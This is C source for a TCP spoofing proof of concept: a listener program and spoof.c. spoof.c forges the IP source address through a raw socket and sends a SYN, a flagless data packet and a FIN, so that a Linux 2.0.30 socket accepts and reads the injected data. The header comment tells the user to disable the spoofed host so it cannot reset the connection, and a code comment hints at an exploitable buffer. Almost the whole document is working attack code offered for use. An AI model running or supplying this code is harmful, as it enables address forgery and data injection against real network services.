/*
This one sends a SYN packet, a Null packet (no flags at all) with 8 bytes
of data and a FIN packet to the target.

usage: spoof source_ip source_port target_ip target_port

Don't forget to disable host source_ip so it cannot send RST's. I've tested
this on Linux 2.0.30. After the FIN packet is received, the accept call
returnes and the read call gives the data sent with the Null packet.
*/
#include <stdio.h>
#include <errno.h>
#include <sys/socket.h>
#include <unistd.h>
#include <stdlib.h>
#include <netinet/in.h>

main(int argc, char *argv[])
{
 int i,n,dummy,new;
 struct sockaddr_in address,source_addr;
 char buffer[8];

 address.sin_family = AF_INET;
 address.sin_port = htons(atoi(argv[1]));
 address.sin_addr.s_addr = 0;

 if((i=socket(AF_INET,SOCK_STREAM,6))<0)   /*create socket*/
  {
   perror("socket\n");
   exit(1);
  }
 if((bind(i,(struct sockaddr *)&address,sizeof(struct sockaddr_in)))<0)
   {                                                /*bind socket to address*/
    perror("bind");
    exit(1);
   }
 if((listen(i,2))<0)
   {
    perror("listen");
    exit(1);
   }
 printf("listening on socket\n");
 new=accept(i,(struct sockaddr *)&source_addr,&dummy);
 if(new>0)
   printf("connected!\n");
 else
  {
   perror("accept");
   exit(1);
  }
 fflush(stdout);
 n=read(new,buffer,8);
 printf("read %i bytes from socket\n",n);
 printf("message is: %s\n",buffer);
}

--------------------------------spoof.c---------------------------------
#include <stdio.h>
#include <netinet/ip.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/types.h>
#include <asm/types.h>

#define FIN 1
#define SYN 2
#define SEQ 20985

/*---------------Checksum calculation--------------------------------*/
unsigned short in_cksum(unsigned short *addr,int len)
{
 register int nleft = len;
 register unsigned short *w = addr;
 register int sum = 0;
 unsigned short answer = 0;

 while (nleft > 1)
        {
        sum += *w++;
        nleft -= 2;
        }
 if (nleft == 1)
        {
        *(u_char *)(&answer) = *(u_char *)w ;
        sum += answer;
        }
 sum = (sum >> 16) + (sum & 0xffff);
 sum += (sum >> 16);
 answer = ~sum;
 return(answer);
}
/*----------------------------------------------------------------------*/

/*------------Send spoofed TCP packet-----------------------------------*/
int send_tcp(int sfd,unsigned int src,unsigned short src_p,
             unsigned int dst,unsigned short dst_p,tcp_seq seq,tcp_seq ack,
             u_char flags,char *buffer,int len)
{
 struct iphdr ip_head;
 struct tcphdr tcp_head;
 struct sockaddr_in target;
 char packet[2048];     /*the exploitation of this is left as an exercise..*/
 int i;

 struct tcp_pseudo        /*the tcp pseudo header*/
 {
  __u32 src_addr;
  __u32 dst_addr;
  __u8  dummy;
  __u8  proto;
  __u16 length;
 } pseudohead;

 struct help_checksum   /*struct for checksum calculation*/
 {
  struct tcp_pseudo pshd;
  struct tcphdr tcphd;
  char tcpdata[1024];
 } tcp_chk_construct;


 /*Prepare IP header*/
 ip_head.ihl      = 5;     /*headerlength with no options*/
 ip_head.version  = 4;
 ip_head.tos      = 0;
 ip_head.tot_len  = htons(sizeof(struct iphdr)+sizeof(struct tcphdr)+len);
 ip_head.id       = htons(31337 + (rand()%100));
 ip_head.frag_off = 0;
 ip_head.ttl      = 255;
 ip_head.protocol = IPPROTO_TCP;
 ip_head.check    = 0;    /*Fill in later*/
 ip_head.saddr    = src;
 ip_head.daddr    = dst;
 ip_head.check    = in_cksum((unsigned short *)&ip_head,sizeof(struct iphdr));

 /*Prepare TCP header*/
 tcp_head.th_sport = htons(src_p);
 tcp_head.th_dport = htons(dst_p);
 tcp_head.th_seq   = htonl(seq);
 tcp_head.th_ack   = htonl(ack);
 tcp_head.th_x2    = 0;
 tcp_head.th_off   = 5;
 tcp_head.th_flags = flags;
 tcp_head.th_win   = htons(0x7c00);
 tcp_head.th_sum   = 0;  /*Fill in later*/
 tcp_head.th_urp   = 0;

 /*Assemble structure for checksum calculation and calculate checksum*/
 pseudohead.src_addr=ip_head.saddr;
 pseudohead.dst_addr=ip_head.daddr;
 pseudohead.dummy=0;
 pseudohead.proto=ip_head.protocol;
 pseudohead.length=htons(sizeof(struct tcphdr)+len);

 tcp_chk_construct.pshd=pseudohead;
 tcp_chk_construct.tcphd=tcp_head;
 memcpy(tcp_chk_construct.tcpdata,buffer,len);

 tcp_head.th_sum=in_cksum((unsigned short *)&tcp_chk_construct,
                         sizeof(struct tcp_pseudo)+sizeof(struct tcphdr)+len);

 /*Assemble packet*/
 memcpy(packet,(char *)&ip_head,sizeof(ip_head));
 memcpy(packet+sizeof(ip_head),(char *)&tcp_head,sizeof(tcp_head));
 memcpy(packet+sizeof(ip_head)+sizeof(tcp_head),buffer,len);

 /*Send packet*/
 target.sin_family     = AF_INET;
 target.sin_addr.s_addr= ip_head.daddr;
 target.sin_port       = tcp_head.th_dport;
 i=sendto(sfd,packet,sizeof(struct iphdr)+sizeof(struct tcphdr)+len,0,
                    (struct sockaddr *)&target,sizeof(struct sockaddr_in));
 if(i<0)
   return(-1); /*Error*/
 else
   return(i); /*Return number of bytes sent*/
}
/*---------------------------------------------------------------------*/

main(int argc, char *argv[])
{
 int i;
 unsigned int source,target;
 unsigned short int s_port,d_port;
 char data[]="abcdefg";

 source=inet_addr(argv[1]);
 s_port=atoi(argv[2]);
 target=inet_addr(argv[3]);
 d_port=atoi(argv[4]);

 if((i=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))<0)  /*open sending socket*/
  {
   perror("socket");
   exit(1);
  }
 send_tcp(i,source,s_port,target,d_port,SEQ,0,SYN,NULL,0);
 printf("SYN sent\n");
 usleep(1000);
 send_tcp(i,source,s_port,target,d_port,SEQ+1,0,0,data,8); /*no flags set*/
 printf("data sent\n");
 usleep(1000);
 send_tcp(i,source,s_port,target,d_port,SEQ+9,0,FIN,NULL,0);
 printf("FIN sent\n");
 close(i);
}
